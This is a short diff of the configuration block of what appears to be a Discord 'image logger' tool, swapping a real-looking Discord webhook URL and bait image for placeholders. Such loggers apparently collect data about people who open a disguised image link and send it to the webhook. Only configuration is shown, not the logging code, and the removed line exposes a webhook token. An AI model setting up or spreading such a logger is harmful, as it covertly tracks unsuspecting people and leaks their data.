@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1480080174413254750/DnbnDOpSbLkcykj8j1I9cv5Txpy5UjzznAU7j72uuZcMrHfe-6H9W1s9yn3wF5li7Jo9",
-    "image": "https://variety.com/wp-content/uploads/2021/07/Rick-Astley-Never-Gonna-Give-You-Up.png?w=1000&h=667&crop=1", # You can also have a custom image by using a URL argument
+    "webhook": "YOUR DISCORD WEBHOOK!",
+    "image": "YOUR IMAGE URL!", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
